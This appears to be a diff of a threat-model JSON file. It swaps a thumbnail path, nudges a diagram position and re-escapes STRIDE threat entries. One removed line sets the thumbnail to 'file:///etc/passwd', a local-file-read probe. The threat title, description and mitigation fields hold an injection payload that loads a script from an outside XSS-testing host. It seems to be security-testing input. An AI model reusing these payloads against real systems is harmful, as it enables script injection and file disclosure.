@@ -17,7 +17,7 @@
     "diagrams": [
       {
         "title": "Main Request Data Flow",
-        "thumbnail": "file:///etc/passwd",
+        "thumbnail": "./public/content/images/thumbnail.jpg",
         "id": 0,
         "diagramJson": {
           "cells": [
@@ -1034,8 +1034,8 @@
                 "height": 80
               },
               "position": {
-                "x": 40,
-                "y": 420
+                "x": 37,
+                "y": 422
               },
               "angle": 0,
               "id": "bdd3e115-4b92-4020-90b7-c3351dba292b",
@@ -1232,24 +1232,24 @@
               "threats": [
                 {
                   "ruleId": "b2a6d40d-d3f8-4750-8e4d-c02cc84b13dc",
-                  "title": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
+                  "title": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
                   "type": "Spoofing",
                   "modelType": "STRIDE",
                   "status": "Open",
                   "severity": "Medium",
-                  "description": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
-                  "mitigation": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
+                  "description": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
+                  "mitigation": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
                   "threatId": "b922aa6a-fbe8-454e-b84e-77def727e145"
                 },
                 {
                   "ruleId": "87bc37e2-798e-4d68-bb96-feb1da26da48",
-                  "title": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
+                  "title": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
                   "type": "Repudiation",
                   "modelType": "STRIDE",
                   "status": "Open",
                   "severity": "Medium",
-                  "description": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
-                  "mitigation": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
+                  "description": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
+                  "mitigation": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
                   "threatId": "fd605575-4cac-4e75-96cd-72e721579b90"
                 }
               ],
